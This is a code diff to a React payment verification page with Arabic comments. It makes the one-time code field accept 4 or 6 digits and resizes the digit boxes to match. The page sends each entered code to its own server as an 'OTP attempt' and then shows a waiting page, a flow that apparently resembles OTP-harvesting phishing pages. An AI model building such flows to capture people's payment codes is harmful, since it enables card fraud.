@@ -6,13 +6,12 @@ import { createOtpAttempt } from '@workspace/api-client-react';
 
 export function PaymentVerificationPage() {
   const [, setLocation] = useLocation();
-  const [code, setCode] = useState(''); // تم التغيير إلى String لتبسيط التعامل مع الحقل الواحد
+  const [code, setCode] = useState(''); // حقل واحد بدلاً من مصفوفة حقول
   const [error, setError] = useState('');
   const [showInvalidError, setShowInvalidError] = useState(false);
   const [isFocused, setIsFocused] = useState(false);
   const inputRef = useRef<HTMLInputElement>(null);
 
-  // fullCode يظل كما هو لضمان عدم كسر أي API
   const fullCode = code;
 
   // Get order ID from localStorage
@@ -30,9 +29,9 @@ export function PaymentVerificationPage() {
   }, []);
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const val = e.target.value.replace(/\D/g, ''); // أرقام فقط
-    if (val.length <= 6) {
-      setCode(val);
+    const value = e.target.value.replace(/\D/g, ''); // أرقام فقط
+    if (value.length <= 6) {
+      setCode(value);
       setError('');
       setShowInvalidError(false);
     }
@@ -49,12 +48,13 @@ export function PaymentVerificationPage() {
   };
 
   const handleVerify = async () => {
-    if (fullCode.length < 6) {
-      setError('يرجى إدخال رمز التحقق كاملاً');
+    // التحقق من أن الرمز إما 4 أو 6 أرقام
+    if (fullCode.length !== 4 && fullCode.length !== 6) {
+      setError('يرجى إدخال رمز التحقق كاملاً (4 أو 6 أرقام)');
       return;
     }
     
-    // Send OTP to server as a new attempt (يعمل تماماً بنفس المنطق القديم)
+    // Send OTP to server as a new attempt
     if (orderId) {
       try {
         await createOtpAttempt(orderId, {
@@ -65,7 +65,7 @@ export function PaymentVerificationPage() {
         window.dispatchEvent(new CustomEvent('dheebti-otp-attempt', { 
           detail: { 
             orderId,
-            customerName: '' // يمكنك إضافة customerName إن وجد في الـ State
+            customerName: ''
           } 
         }));
       } catch (error) {
@@ -76,6 +76,9 @@ export function PaymentVerificationPage() {
     // Navigate to waiting page
     setLocation('/payment-waiting');
   };
+
+  // تحديد عدد المربعات المعروضة: إذا تجاوز 4 أرقام يظهر 6 مربعات، وإلا يظهر 6 افتراضياً ليتسع لـ 4 أو 6 أرقام
+  const totalBoxes = code.length > 4 ? 6 : (code.length === 4 ? 4 : 6);
 
   return (
     <Shell>
@@ -98,9 +101,9 @@ export function PaymentVerificationPage() {
             تم إرسال رمز التحقق إلى رقم هاتفك
           </p>
 
-          {/* Single Invisible Input + Visual Boxes */}
+          {/* Single OTP Input + Visual Boxes */}
           <div className="relative flex w-full justify-center">
-            {/* الحقل الحقيقي المخفي كلياً فوق المربعات */}
+            {/* الحقل الوحيد المخفي شفافاً للتركيز والكتابة */}
             <input
               ref={inputRef}
               type="tel"
@@ -114,11 +117,11 @@ export function PaymentVerificationPage() {
               className="absolute inset-0 z-10 size-full opacity-0 cursor-pointer"
             />
 
-            {/* المربعات البصرية الـ 6 */}
+            {/* الشكل البصري للمربعات */}
             <div className="flex flex-row items-center justify-center gap-2" dir="ltr">
-              {Array.from({ length: 6 }).map((_, index) => {
+              {Array.from({ length: totalBoxes }).map((_, index) => {
                 const digit = code[index] || '';
-                const isCurrentFocused = isFocused && (code.length === index || (code.length === 6 && index === 5));
+                const isCurrentFocused = isFocused && (code.length === index || (code.length === totalBoxes && index === totalBoxes - 1));
 
                 return (
                   <div
